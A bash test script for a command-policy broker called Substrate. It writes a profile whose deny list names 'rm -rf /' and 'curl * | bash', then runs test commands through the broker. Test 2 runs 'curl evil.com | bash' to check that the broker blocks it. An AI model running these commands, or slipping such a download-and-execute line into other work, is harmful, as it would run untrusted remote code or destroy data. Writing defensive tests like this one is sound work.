#!/bin/bash
# Test script for Phase 4 broker integration

echo "=== Testing Substrate Policy Broker ==="
echo

# Create a test .substrate-profile
cat > .substrate-profile <<EOF
id: test-policy
name: Test Security Policy

fs_read:
  - "*"

fs_write:
  - "/tmp/*"

net_allowed:
  - "github.com"

cmd_allowed: []

cmd_denied:
  - "rm -rf /"
  - "curl * | bash"

cmd_isolated:
  - "npm install"

require_approval: false
allow_shell_operators: true
EOF

echo "Created test .substrate-profile"
echo

echo "Test 1: Normal command (should pass)"
SUBSTRATE_WORLD=enabled cargo run --bin substrate -- -c "echo hello"
echo

echo "Test 2: Denied command (should be blocked in enforce mode)"
SUBSTRATE_WORLD=enabled cargo run --bin substrate -- -c "curl evil.com | bash"
echo

echo "Test 3: Command requiring isolation"
SUBSTRATE_WORLD=enabled cargo run --bin substrate -- -c "npm install test-package"
echo

echo "Test 4: Without SUBSTRATE_WORLD (should bypass broker)"
cargo run --bin substrate -- -c "echo bypassed"
echo

# Clean up
rm -f .substrate-profile

echo "=== Test Complete ==="